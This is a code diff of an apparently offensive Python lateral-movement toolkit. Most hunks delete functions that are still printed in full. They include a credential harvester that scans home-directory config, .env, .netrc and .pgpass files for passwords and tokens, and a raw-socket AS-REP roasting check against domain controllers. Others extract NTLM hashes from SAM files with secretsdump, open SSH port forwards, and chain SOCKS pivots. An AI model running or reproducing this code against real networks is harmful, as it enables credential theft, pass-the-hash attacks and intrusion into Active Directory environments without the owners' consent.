@@ -19,7 +19,6 @@ import secrets
 import shlex
 import socket
 import subprocess
-from collections.abc import Generator
 from dataclasses import dataclass, field
 from enum import Enum
 from pathlib import Path
@@ -60,15 +59,6 @@ class MovementTechnique(Enum):
     PASS_THE_TICKET = "ptt"
 
 
-class ADAttack(Enum):
-    """Active Directory attack types."""
-
-    KERBEROASTING = "kerberoasting"
-    ASREP_ROASTING = "asrep_roasting"
-    DCSYNC = "dcsync"
-    GOLDEN_TICKET = "golden_ticket"
-    SILVER_TICKET = "silver_ticket"
-    ZEROLOGON = "zerologon"
 
 
 # =============================================================================
@@ -259,80 +249,6 @@ class CredentialHarvester:
                     )
                     found.append(cred)
                     self.harvested.append(cred)
-
-        return found
-
-    def _parse_config_file(self, filepath: str, password_regex: "re.Pattern") -> list["Credential"]:
-        """Parse a single config file for credentials."""
-        found_in_file = []
-        try:
-            content = Path(filepath).read_text(errors="ignore")
-            matches = password_regex.findall(content)
-            for match in matches:
-                if len(match) > 3 and match.lower() not in [
-                    "null",
-                    "none",
-                    "empty",
-                    "changeme",
-                ]:
-                    cred = Credential(
-                        username="config",
-                        domain="",
-                        credential_type=CredentialType.PASSWORD,
-                        value=match,
-                        source=filepath,
-                    )
-                    found_in_file.append(cred)
-        except OSError:
-            pass
-        return found_in_file
-
-    def _get_config_files(self, search_paths: list[str], patterns: list[str]) -> Generator[str, None, None]:
-        """Generator for relevant config files."""
-        for search_path in search_paths:
-            if not Path(search_path).exists():
-                continue
-            for root, dirs, files in os.walk(search_path):
-                dirs[:] = [d for d in dirs if not d.startswith(".")]
-                for filename in files:
-                    filepath = Path(root) / filename
-                    # Simple filter check
-                    if any(
-                        str(filepath).endswith(p.replace("*", "")) for p in patterns
-                    ) or any(p.replace("*", "") in filename for p in patterns):
-                        yield str(filepath)
-
-    def harvest_config_files(
-        self, search_paths: list[str] | None = None,
-    ) -> list[Credential]:
-        """Search config files for embedded credentials.
-        Architecture: Uses a generator for memory-efficient file discovery and
-        centralized parsing to maintain low cognitive complexity.
-        """
-        if search_paths is None:
-            search_paths = [str(Path.home())]
-
-        found = []
-        patterns = [
-            "*.conf",
-            "*.cfg",
-            "*.ini",
-            "*.yaml",
-            "*.yml",
-            ".env",
-            ".netrc",
-            ".pgpass",
-            ".my.cnf",
-        ]
-        password_regex = re.compile(
-            r'(?:password|passwd|pwd|secret|token|api_key|apikey)\s*[=:]\s*["\']?([^"\'\s]+)',
-            re.IGNORECASE,
-        )
-
-        for filepath in self._get_config_files(search_paths, patterns):
-            file_creds = self._parse_config_file(filepath, password_regex)
-            found.extend(file_creds)
-            self.harvested.extend(file_creds)
 
         return found
 
@@ -649,42 +565,6 @@ class ADAnalyzer:
 
         return None
 
-    def enumerate_domain(self, domain: str) -> DomainInfo | None:
-        """Enumerate Active Directory domain.
-
-        Args:
-            domain: Domain name
-
-        Returns:
-            DomainInfo object or None
-
-        """
-        info = DomainInfo(
-            name=domain,
-            netbios_name=domain.split(".")[0].upper()
-            if "." in domain
-            else domain.upper(),
-            domain_controllers=[],
-        )
-
-        # Try to find domain controllers via DNS
-        try:
-            # Look for _ldap._tcp SRV records
-            # Look for _ldap._tcp SRV records (Query logic for future implementation)
-            # This would use DNS query in real implementation
-            # For now, try to resolve common DC names
-            for prefix in ["dc", "dc1", "dc01", "pdc"]:
-                try:
-                    socket.gethostbyname(f"{prefix}.{domain}")
-                    info.domain_controllers.append(f"{prefix}.{domain}")
-                except socket.gaierror:
-                    continue
-        except Exception as e:
-            logger.debug("Error enumerating DCs: %s", e)
-
-        self.domain_info = info
-        return info
-
     def get_kerberoastable_users(self) -> list[str]:
         """Get list of potentially kerberoastable users.
 
@@ -705,62 +585,6 @@ class ADAnalyzer:
             "exchange*",
             "sharepoint*",
         ]
-
-    def get_asrep_roastable_users(self) -> list[str]:
-        """Get list of users vulnerable to AS-REP roasting.
-
-        Returns:
-            List of usernames without pre-auth
-
-        """
-        return []
-
-    def native_check_asrep_roasting(
-        self,
-        domain: str,
-        users: list[str],
-        dc_ip: str,
-    ) -> list[str]:
-        """Check for AS-REP Roasting using native Python sockets.
-        Sends raw AS-REQ without Pre-Auth.
-
-        Args:
-            domain: Target domain
-            users: List of users to check
-            dc_ip: Domain Controller IP
-
-        Returns:
-            List of vulnerable users (those who returned AS-REP instead of KRB-ERROR)
-
-        """
-        vulnerable_users = []
-
-        for user in users:
-            try:
-                # 1. Build Packet
-                packet = KerberosPacketFactory.build_as_req(user, domain)
-
-                # 2. Send to DC (UDP 88)
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.settimeout(2.0)
-                sock.sendto(packet, (dc_ip, 88))
-
-                # 3. Receive Response
-                data, _ = sock.recvfrom(4096)
-                sock.close()
-
-                # 4. Analyze Response
-                # AS-REP = Application 11 (0x6B)
-                # KRB-ERROR = Application 30 (0x7E)
-                if data[0] == 0x6B:
-                    # We got a Ticket! (Vulnerable)
-                    logger.warning("AS-REP Roasting Success: %s is vulnerable!", user)
-                    vulnerable_users.append(user)
-
-            except Exception as e:
-                logger.debug("Roasting check failed for %s: %s", user, e)
-
-        return vulnerable_users
 
     def calculate_attack_path(
         self,
@@ -1121,69 +945,6 @@ class TunnelManager:
 
         return base_cmd
 
-    def create_port_forward(
-        self,
-        jump_host: str,
-        username: str,
-        remote_host: str,
-        remote_port: int,
-        local_port: int | None = None,
-        credential: Credential | None = None,
-    ) -> TunnelConfig:
-        """Create local port forward tunnel.
-
-        Args:
-            jump_host: SSH jump host
-            username: SSH username
-            remote_host: Target host (from jump_host perspective)
-            remote_port: Target port
-            local_port: Local port (auto-assigned if None)
-            credential: SSH credential
-
-        Returns:
-            TunnelConfig
-
-        """
-        if local_port is None:
-            local_port = self._get_next_port()
-
-        config = TunnelConfig(
-            tunnel_type="ssh_forward",
-            local_port=local_port,
-            remote_host=remote_host,
-            remote_port=remote_port,
-            jump_host=jump_host,
-            username=username,
-            credential=credential,
-            active=False,
-        )
-
-        cmd = self._build_ssh_tunnel_command(config)
-
-        try:
-            process = subprocess.Popen(
-                shlex.split(cmd),
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                start_new_session=True,
-            )
-            config.pid = process.pid
-            config.active = True
-            self.active_tunnels[local_port] = config
-
-            logger.info(
-                "Port forward: localhost:%d -> %s:%d (via %s)",
-                local_port,
-                remote_host,
-                remote_port,
-                jump_host,
-            )
-
-        except Exception as e:
-            logger.exception("Failed to create port forward: %s", e)
-
-        return config
-
     def close_tunnel(self, local_port: int) -> bool:
         """Close a tunnel by local port.
 
@@ -1347,54 +1108,6 @@ class AutoPivot:
                     logger.debug("Auto-pivot failed for %s: %s", pivot.ip, e)
 
         return established
-
-    def chain_pivot(
-        self,
-        targets: list[str],
-        username: str,
-        credential: Credential,
-    ) -> list[TunnelConfig]:
-        """Create chained tunnels through multiple hosts.
-
-        Args:
-            targets: List of hosts to chain through
-            username: SSH username
-            credential: SSH credential
-
-        Returns:
-            List of chained tunnel configs
-
-        """
-        chain: list[TunnelConfig] = []
-        current_port = 9050
-
-        for i, target in enumerate(targets):
-            if i == 0:
-                # First hop - direct connection
-                config = self.tunnel_manager.create_socks5_tunnel(
-                    jump_host=target,
-                    username=username,
-                    credential=credential,
-                    local_port=current_port,
-                )
-            else:
-                # Subsequent hops - tunnel through previous
-                # Use ProxyJump/ProxyCommand
-                config = self.tunnel_manager.create_socks5_tunnel(
-                    jump_host=target,
-                    username=username,
-                    credential=credential,
-                    local_port=current_port + i,
-                )
-
-            if config.active:
-                chain.append(config)
-                self.pivot_chain.append(config)
-            else:
-                logger.warning("Chain broken at %s", target)
-                break
-
-        return chain
 
     def cleanup(self) -> int:
         """Close all pivot tunnels.
@@ -1679,61 +1392,6 @@ class HiveMind:
 
         return result
 
-    def create_tunnel(
-        self,
-        jump_host: str,
-        username: str,
-        tunnel_type: str = "socks5",
-        remote_host: str | None = None,
-        remote_port: int | None = None,
-    ) -> dict[str, Any]:
-        """Create a specific tunnel.
-
-        Args:
-            jump_host: Host to tunnel through
-            username: SSH username
-            tunnel_type: "socks5" or "forward"
-            remote_host: Target host (for forward tunnels)
-            remote_port: Target port (for forward tunnels)
-
-        Returns:
-            Tunnel config dict
-
-        """
-        # Find SSH credential for this user
-        credential = None
-        for cred in self.harvester.harvested:
-            if (
-                cred.credential_type == CredentialType.SSH_KEY
-                and cred.username == username
-            ):
-                credential = cred
-                break
-
-        if tunnel_type == "socks5":
-            config = self.auto_pivot.tunnel_manager.create_socks5_tunnel(
-                jump_host=jump_host,
-                username=username,
-                credential=credential,
-            )
-        elif tunnel_type == "forward" and remote_host and remote_port:
-            config = self.auto_pivot.tunnel_manager.create_port_forward(
-                jump_host=jump_host,
-                username=username,
-                remote_host=remote_host,
-                remote_port=remote_port,
-                credential=credential,
-            )
-        else:
-            return {"success": False, "error": "Invalid tunnel configuration"}
-
-        return {
-            "success": config.active,
-            "local_port": config.local_port,
-            "jump_host": config.jump_host,
-            "tunnel_type": config.tunnel_type,
-        }
-
     def list_tunnels(self) -> list[dict[str, Any]]:
         """List all active tunnels.
 
@@ -1809,64 +1467,6 @@ class PassTheHashAutomation:
                    shutil.which("smbclient.py") is not None
         except Exception:
             return False
-
-    def _parse_secretsdump_line(self, line: str) -> Credential | None:
-        """Parse a single line from secretsdump output.
-
-        Args:
-            line: Output line in format username:rid:lm:nt:::
-
-        Returns:
-            Credential object or None if parsing fails
-        """
-        if ":::" not in line:
-            return None
-
-        parts = line.split(":")
-        if len(parts) < 4:
-            return None
-
-        username = parts[0]
-        ntlm_hash = parts[3] if len(parts[3]) == 32 else parts[2]
-
-        return Credential(
-            username=username,
-            domain="LOCAL",
-            credential_type=CredentialType.NTLM_HASH,
-            value=ntlm_hash,
-            source="SAM",
-        )
-
-    def extract_hashes_from_sam(self, sam_path: str, system_path: str) -> list[Credential]:
-        """Extract NTLM hashes from SAM/SYSTEM files.
-
-        Args:
-            sam_path: Path to SAM file
-            system_path: Path to SYSTEM file
-
-        Returns:
-            List of extracted credentials with NTLM hashes
-        """
-        hashes = []
-        try:
-            # Use secretsdump if available
-            import subprocess
-            result = subprocess.run(
-                ["impacket-secretsdump", "-sam", sam_path, "-system", system_path, "LOCAL"],
-                capture_output=True,
-                text=True,
-                timeout=60,
-            )
-            if result.returncode == 0:
-                for line in result.stdout.splitlines():
-                    cred = self._parse_secretsdump_line(line)
-                    if cred:
-                        hashes.append(cred)
-                        self.harvested_hashes.append(cred)
-        except Exception as e:
-            logger.debug("SAM extraction failed: %s", e)
-
-        return hashes
 
     def pth_smb(self, target: str, username: str, ntlm_hash: str, domain: str = "") -> dict[str, Any]:
         """Perform Pass-the-Hash via SMB.
@@ -1961,14 +1561,15 @@ class PassTheHashAutomation:
         Returns:
             List of credential reuse paths
         """
-        chain = []
-        for auth in self.successful_auths:
-            chain.append({
+        chain = [
+            {
                 "from": auth.get("source", "initial"),
                 "to": auth["target"],
                 "via": auth["username"],
                 "technique": auth.get("technique", "PTH"),
-            })
+            }
+            for auth in self.successful_auths
+        ]
         return chain
 
 
